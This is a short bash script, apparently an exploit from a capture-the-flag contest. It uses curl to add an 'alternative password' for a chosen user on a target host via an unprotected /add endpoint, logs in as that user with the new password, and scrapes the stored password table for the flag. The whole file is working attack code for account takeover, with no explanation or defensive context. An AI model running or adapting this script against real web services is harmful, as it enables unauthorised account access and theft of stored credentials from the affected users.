#!/bin/bash
set -e
if [ -z "$1" ]; then 
	echo "Usage: $(basename $0) HOST USER"
	exit 1
fi
PASSWORD=$(cat /dev/urandom | tr -dc A-Za-z0-9 | head -c 13)
COOKIE=$(cat /dev/urandom | tr -dc A-Za-z0-9 | head -c 32)

echo "Adding alternative password (hack) ..."
curl http://$1/add -d "address=http://some.site/&user=$2&password=$PASSWORD" --cookie "ctf=$COOKIE" 
echo "Added alternative password $PASSWORD for user $2"

echo "Logging in as $2 ..."
curl http://$1/ -d "user=$2&password=$PASSWORD&login=Login" -c ./cookies.txt
echo "Login success"

echo "Getting flag ..."
curl -s http://$1/ -b ./cookies.txt | grep "<th>Password</th>" -A10
echo "Get success"
